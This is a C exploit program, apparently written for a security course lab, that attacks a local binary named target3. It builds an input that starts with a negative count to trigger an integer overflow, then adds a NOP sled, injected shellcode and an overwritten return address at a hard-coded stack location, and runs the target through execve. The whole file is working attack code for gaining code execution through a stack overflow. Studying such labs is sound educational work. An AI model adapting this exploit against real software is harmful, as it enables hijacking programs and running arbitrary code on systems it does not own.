#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  // buf to target foo function in target3
  char buf[4832];
  // address of the local variable buf in foo function
  int addr;
  addr = 0xbfffd8d8;
  // count to overflow int in target3
  char *count;
  count = "-2147483407";
  
  int i;
  for(i = 0; i < 4832; i++) {
    if(i < strlen(count)) {
      *(buf + i) = count[i]; // add count
    } else if(i < (strlen(count) + 1)) {
      *(buf + i) = ','; // add comma
    } else if(i < (4800 + strlen(count) + 1 - strlen(shellcode))) {
      *(buf + i) = '\x90'; // add nope
    } else if(i < (4800 + strlen(count) + 1)) {
      *(buf + i) = shellcode[i - 4800 - strlen(count) - 1 + strlen(shellcode)]; // add shellcode
    } else if(i < (4804 + strlen(count) + 1)) {
      *(buf + i) = '\x90'; // sfp
    } else if(i < (4808 + strlen(count) + 1)) {
       *(buf + i) = addr >> ((i - 4800 - strlen(count) - 1) * 8); // make fake ret
    } else {
      *(buf + i) = '\x00'; // add null
    }
  }

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
